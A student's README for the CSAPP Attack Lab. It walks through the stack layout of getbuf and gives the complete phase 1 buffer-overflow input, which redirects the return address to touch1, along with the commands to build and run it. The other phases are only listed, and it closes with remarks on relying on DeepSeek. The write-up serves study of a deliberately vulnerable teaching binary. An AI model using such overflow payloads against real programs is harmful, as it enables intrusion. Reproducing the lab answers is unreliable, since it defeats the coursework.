# AttackLab

Here is the third lab of CSAPP and all resources come from the Seif-Study part of this URL [https://csapp.cs.cmu.edu/3e/labs.html](https://csapp.cs.cmu.edu/3e/labs.html) 

---

## Project Structure

```
attacklab/
├── target1/                  # Decompressed attacklab folder, and edited by me
├── answer/                   # The folder answers stored
└── README.md                 # This file
```

---

## Answer

All answers of five phases can be seen in `./answer/`:

The touch1 in ctarget in [touch1.txt](.\answer\touch1.txt)

The touch2 in ctarget in [touch2.txt](.\answer\touch2.txt)

The touch3 in ctarget in [touch3.txt](.\answer\touch3.txt)

The touch1 in rtarget in [rtouch1.txt](.\answer\rtouch1.txt)

The touch2 in rtarget in [rtouch2.txt](.\answer\rtouch2.txt)

The touch3 in rtarget in [rtouch3.txt](.\answer\rtouch3.txt)

---

## Thinking

When you run command `ctarget -q -i <binary-file>`, The function `getbuf` is called to allocate a buffer whose size is 40 bytes.

```asm
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 ac 03 00 00       	callq  401b60 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq   
  4017be:	90                   	nop
  4017bf:	90                   	nop
```

All of solutions of five phases are based on `getbuf` and buffer allocated on the stack. 

### Phase 1

The goal of phase1 is to run `touch1`. In other to make it, we need to make `touch1` run when `getbuf` completed.

What will happen if we input more than 40 bytes? The buffer will overflow, and the overflowed part will overwrite return address and makes some effects no one knows.

Here is structure of stack.

```ascii
high address
    ___________________
    |                 |
    |                 |
    |     0x28        |
    |                 |
    |                 |
    |_________________|
    | rerturn address |
    |_________________|

low address
```

The question is easier: we only need to replace origin address with address of `touch1` and fill the buffer with something. It's not difficult.

```gdb
file ctarget
disassemble touch1
```

Soon, we find the address of `touch1` is **0x4017c0**.

```asm
00000000004017c0 <touch1>:
  4017c0:	48 83 ec 08          	sub    $0x8,%rsp
  4017c4:	c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc <vlevel>
  4017cb:	00 00 00 
  4017ce:	bf c5 30 40 00       	mov    $0x4030c5,%edi
  4017d3:	e8 e8 f4 ff ff       	callq  400cc0 <puts@plt>
  4017d8:	bf 01 00 00 00       	mov    $0x1,%edi
  4017dd:	e8 ab 04 00 00       	callq  401c8d <validate>
  4017e2:	bf 00 00 00 00       	mov    $0x0,%edi
  4017e7:	e8 54 f6 ff ff       	callq  400e40 <exit@plt>
```

Because x86 uses small segment storage, we need turn **40 17 c0** to **c0 17 40**.

The answer is:

```txt
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00
```

It's a txt file, but actually we need a binary file. We can use this command:

```bash
./hex2raw < target-file.txt > target-file
```

It is recommended to use commands for a perfect file if binary file generated has `0a` at the end of the biary file.

```bash
xxd target-file
truncate -s 48 target-file
xxd target-file
```

Good! We can run this command to look for result.
```bash
./ctarget -q -i target-file
```

If you feel confused for parameters `-q`, `-i`, you can run the command for help.
```bash
./ctarget -h
```

The commands above wouldn't be mentioned at following chapters.


### Phase 2

To be continued...

---

## Feelings

### Lab Self

Attack Lab is much harder than Bomb Lab.

### AI

Before I share my feeling, I highly emphasize that all "llm" or "AI" I mentioned below is DeepSeek web version. It's known that all models in web are silly, which is obvious for API users. In other words, results below may don't fit on sota models like GPT6 Astra, Kimi K3 or Claude Opus 5.5 and models called thorough API. 

I'm more dependant on llm. When I did bomb lab, llm just needed to tell me some small tip, such as how to use gdb. But when I tried to attack target file, I felt I didn't know what I should do now and next. I asked llm how to start and how to proceed. And when I was confused with phase5, I find AI was not only rigid but also a little bit stubborn. Detailedly, I tried to solve phase5 just like phase3 and phase4. With attempts, I failed. Meanwhile, llm just walked around. And the more times I asked llm for help, the more disappointed I felt. Finally I found a blog, and smoothly finished the whole lab by refering to the idea of blog. So, AI is a good substitute of a research engine, but
llm is not an exceutor for something like choosing direction and pointing out a wise path. 

## Addentional Issues

**README.md** is not completed yet.

